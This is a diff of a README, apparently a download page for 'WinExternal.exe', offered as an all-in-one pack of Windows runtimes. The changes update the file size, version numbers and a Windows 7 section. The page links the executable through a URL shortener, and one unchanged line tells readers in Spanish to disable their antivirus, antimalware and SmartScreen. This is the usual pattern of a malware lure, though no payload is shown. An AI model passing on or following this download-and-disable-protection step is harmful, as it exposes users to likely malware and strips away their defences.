@@ -12,7 +12,7 @@
 
 |File|OS|Size|
 | :---: | :---: | :---: |
-|[WinExternal.exe (.zip)](http://pc.cd/wBT7)|Windows 7/8/10 x86 x64|461,8 MB|
+|[WinExternal.exe (.zip)](http://pc.cd/wBT7)|Windows 7/8/10 x86 x64|472 MB|
 
 ## HOW TO USE
 
@@ -26,24 +26,24 @@ Desactive su Antivirus, Antimalware, SmartScreen o cualquier otra solución de s
 
 ---
 
-- Adobe Flash Player ActiveX 32 (32.0.0.414) (IE)
-- Adobe Flash Player NPAPI 32 (32.0.0.414) (Firefox)
-- Adobe Shockwave Player 12.3 (12.3.5.205)
 - Oracle Java 8 Update 261 (8.0.2610.0)
-- Microsoft Silverlight x86 x64 (5.1.50918.0)
 - Microsoft Visual Legacy Runtimes x86: Basic/C++ 2002 (7.0.9975.0) - 2003 (7.10.6119.0)
 - Microsoft Visual C++ 2005 Redistributable x86 x64 (8.0.50727.6229)
 - Microsoft Visual C++ 2008 Redistributable x86 x64 (9.30729.7523)
 - Microsoft Visual C++ 2010 Redistributable x86 x64 (10.0.40219.473)
 - Microsoft Visual C++ 2012 Additional and Minimum Runtime x86 x64 (11.0.61135.400)
 - Microsoft Visual C++ 2013 Additional and Minimum Runtime x86 x64 (12.0.40664.0)
-- Microsoft Visual C++ 2019 Additional and Minimum Runtime x86 x64 (14.27.29016.0)
+- Microsoft Visual C++ 2019 Additional and Minimum Runtime x86 x64 (14.28.29213.0)
 - Microsoft Visual J# 2.0 Redistributable Package - SE x86 x64
 - Microsoft Visual Studio 2010 F# Runtime 2.0 SP1 (10.0.40219)
 - Microsoft Visual Studio 2010 Tools for Office Runtime x86 x64 (10.0.60833.0)
 
-### Only Windows 7
+### Only for Windows 7
 
+- Adobe Flash Player ActiveX 32 (32.0.0.414) (IE)
+- Adobe Flash Player NPAPI 32 (32.0.0.414) (Firefox)
+- Adobe Shockwave Player 12.3 (12.3.5.205)
+- Microsoft Silverlight x86 x64 (5.1.50918.0)
 - Microsoft NetFramework 4.8 (4.8.03761)
 - Microsoft XNA Framework Redistributable 4.0 Refresh (4.0.30901.0)
 - Microsoft Filter Pack 2.0 (KB2837594) x86 x64
